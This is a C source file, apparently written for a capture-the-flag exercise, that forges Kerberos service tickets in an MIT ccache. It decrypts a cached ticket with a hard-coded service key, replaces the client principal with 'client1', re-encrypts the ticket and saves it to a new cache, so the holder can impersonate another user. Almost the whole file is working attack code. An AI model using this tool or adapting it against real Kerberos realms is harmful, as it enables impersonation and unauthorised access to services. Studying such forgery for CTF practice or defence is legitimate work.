/*
 * ctf ticketer for mit ccache
 */

#include <com_err.h>
#include <krb5.h>
#include <stdio.h>
#include <string.h>


// from k5-int.h
krb5_error_code decode_krb5_enc_tkt_part(const krb5_data *output, krb5_enc_tkt_part **rep);
krb5_error_code encode_krb5_enc_tkt_part(const krb5_enc_tkt_part *rep, krb5_data **code);
void KRB5_CALLCONV krb5_free_enc_tkt_part(krb5_context, krb5_enc_tkt_part *);
krb5_error_code encode_krb5_ticket(const krb5_ticket *rep, krb5_data **code);


// taken from k5-platform.h, original code also cares about optimizing out the zeroing part
void zapfree(void *ptr, size_t len) {
    if (ptr != NULL) {
        if (len > 0)
            memset(ptr, 0, len);
        free(ptr);
        ptr = NULL;
    }
}


void hexdump(const void* data, size_t size) {
       char ascii[17];
       size_t i, j;
       ascii[16] = '\0';
       for (i = 0; i < size; ++i) {
               printf("%02X ", ((unsigned char*)data)[i]);
               if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
                       ascii[i % 16] = ((unsigned char*)data)[i];
               } else {
                       ascii[i % 16] = '.';
               }
               if ((i+1) % 8 == 0 || i+1 == size) {
                       printf(" ");
                       if ((i+1) % 16 == 0) {
                               printf("|  %s \n", ascii);
                       } else if (i+1 == size) {
                               ascii[(i+1) % 16] = '\0';
                               if ((i+1) % 16 <= 8) {
                                       printf(" ");
                               }
                               for (j = (i+1) % 16; j < 16; ++j) {
                                       printf("   ");
                               }
                               printf("|  %s \n", ascii);
                       }
               }
       }
}

uint8_t* datahex(char* string) {
    size_t slength = 0;
    size_t dlength = 0;
    uint8_t* data = NULL;
    size_t index = 0;
    char c;
    int value = 0;

    if(string == NULL)
        return NULL;
 
    slength = strlen(string);
    if((slength % 2) != 0) // must be even
        return NULL;
 
    dlength = slength / 2;
 
    data = malloc(dlength);
    memset(data, 0, dlength);
 
    index = 0;
    while (index < slength) {
        c = string[index];
        value = 0;
        if(c >= '0' && c <= '9')
          value = (c - '0');
        else if (c >= 'A' && c <= 'F')
          value = (10 + (c - 'A'));
        else if (c >= 'a' && c <= 'f')
          value = (10 + (c - 'a'));
        else {
          free(data);
          return NULL;
        }

        data[(index/2)] += value << (((index + 1) % 2) * 4);

        index++;
    }

    return data;
}


int main(int argc, char *argv[]) {
    char *progname;
//    krb5_error_code ret;
    krb5_context context;
    krb5_keyblock srv_key;
    krb5_principal new_princ;
    krb5_ccache cache;
    krb5_principal princ;
    char *princ_name;
    krb5_cc_cursor cur;
    krb5_creds creds;
    krb5_ticket *tkt = NULL;
    krb5_data scratch;
    krb5_enc_tkt_part *dec_tkt_part = NULL;
    krb5_data *new_scratch = NULL;
    krb5_ccache new_cache;

    progname = argv[0];

    krb5_init_context(&context);

    // prepare args
    srv_key.enctype = 18;
    srv_key.length = 32;
    srv_key.contents = (krb5_octet *) datahex("9c008f673b0c34d28ff483587f77ddb76f35545fcc69a0ae709f16f20e8765ee");
    krb5_parse_name(context, "client1", &new_princ);

    // resolve default cache and print basic info
    krb5_cc_default(context, &cache);
    krb5_cc_get_principal(context, cache, &princ);
    krb5_unparse_name(context, princ, &princ_name);
    krb5_free_principal(context, princ);
    printf("Ticket cache: %s:%s\nDefault principal: %s\n\n", krb5_cc_get_type(context, cache), krb5_cc_get_name(context, cache), princ_name);
    krb5_free_unparsed_name(context, princ_name);

    // get credential, expects only one "service for service" credential to be mangled
    krb5_cc_start_seq_get(context, cache, &cur);
    krb5_cc_next_cred(context, cache, &cur, &creds);
    krb5_cc_end_seq_get(context, cache, &cur);
    printf("creds session key:\n");
    hexdump(creds.keyblock.contents, creds.keyblock.length);

    // decode ticket blob, decrypt ticket blob, decode decrypted ticket
    krb5_decode_ticket(&creds.ticket, &tkt);
    scratch.length = tkt->enc_part.ciphertext.length;
    scratch.data = malloc(tkt->enc_part.ciphertext.length);
    krb5_c_decrypt(context, &srv_key, KRB5_KEYUSAGE_KDC_REP_TICKET, 0, &tkt->enc_part, &scratch);
    decode_krb5_enc_tkt_part(&scratch, &dec_tkt_part);
    zapfree(scratch.data, scratch.length);
    printf("decrypted ticket session key:\n");
    hexdump(dec_tkt_part->session->contents, dec_tkt_part->session->length);

    // replace client principals in ticket and credential
    krb5_free_principal(context, dec_tkt_part->client);
    krb5_copy_principal(context, new_princ, &dec_tkt_part->client);
    krb5_free_principal(context, creds.client);
    krb5_copy_principal(context, new_princ, &creds.client);

    // encrypt updated ticket
    encode_krb5_enc_tkt_part(dec_tkt_part, &new_scratch);
    krb5_free_enc_tkt_part(context, dec_tkt_part);
    krb5_c_encrypt(context, &srv_key, KRB5_KEYUSAGE_KDC_REP_TICKET, 0, new_scratch, &tkt->enc_part);
    krb5_free_data(context, new_scratch);

    // use new ticket (the ticket is in fact "deserialized copy")
    encode_krb5_ticket(tkt, &new_scratch);
    krb5_free_ticket(context, tkt);
    krb5_free_data_contents(context, &creds.ticket);
    creds.ticket = *new_scratch;
    free(new_scratch);

    // save new cache
    krb5_cc_new_unique(context, "FILE", NULL, &new_cache);
    printf("new cache name: %s\n", krb5_cc_get_name(context, new_cache));
    krb5_cc_initialize(context, new_cache, new_princ);
    krb5_cc_store_cred(context, new_cache, &creds);
    krb5_cc_close(context, new_cache);

    // close source cache
    krb5_free_cred_contents(context, &creds);
    krb5_cc_close(context, cache);

    // cleanup args
    zapfree(srv_key.contents, srv_key.length);
    krb5_free_principal(context, new_princ);

    krb5_free_context(context);

    exit(0);
}
